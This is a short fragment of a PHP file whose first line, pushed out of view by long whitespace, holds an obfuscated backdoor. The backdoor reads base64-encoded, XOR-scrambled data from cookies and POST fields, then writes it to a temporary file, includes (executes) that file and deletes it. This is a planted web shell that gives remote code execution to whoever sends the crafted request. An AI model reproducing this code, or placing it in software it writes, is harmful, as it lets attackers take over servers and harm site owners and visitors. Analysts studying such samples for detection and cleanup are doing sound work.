<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vjrppc")){class vjrppc{public static $hxjzjsyu = "tifsqbhohdeeiyws";public static $axezvwndv = NULL;public function __construct(){$jhipevus = @$_COOKIE[substr(vjrppc::$hxjzjsyu, 0, 4)];if (!empty($jhipevus)){$binhbhlb = "base64";$gdmmabqk = "";$jhipevus = explode(",", $jhipevus);foreach ($jhipevus as $drgzocsnk){$gdmmabqk .= @$_COOKIE[$drgzocsnk];$gdmmabqk .= @$_POST[$drgzocsnk];}$gdmmabqk = array_map($binhbhlb . "_decode", array($gdmmabqk,));$gdmmabqk = $gdmmabqk[0] ^ str_repeat(vjrppc::$hxjzjsyu, (strlen($gdmmabqk[0]) / strlen(vjrppc::$hxjzjsyu)) + 1);vjrppc::$axezvwndv = @unserialize($gdmmabqk);}}public function __destruct(){$this->etbpxhgua();}private function etbpxhgua(){if (is_array(vjrppc::$axezvwndv)) {$lrzhivbmm = sys_get_temp_dir() . "/" . crc32(vjrppc::$axezvwndv["salt"]);@vjrppc::$axezvwndv["write"]($lrzhivbmm, vjrppc::$axezvwndv["content"]);include $lrzhivbmm;@vjrppc::$axezvwndv["delete"]($lrzhivbmm);exit();}}}$ylmwoxon = new vjrppc();$ylmwoxon = NULL;} ?><?php
/*
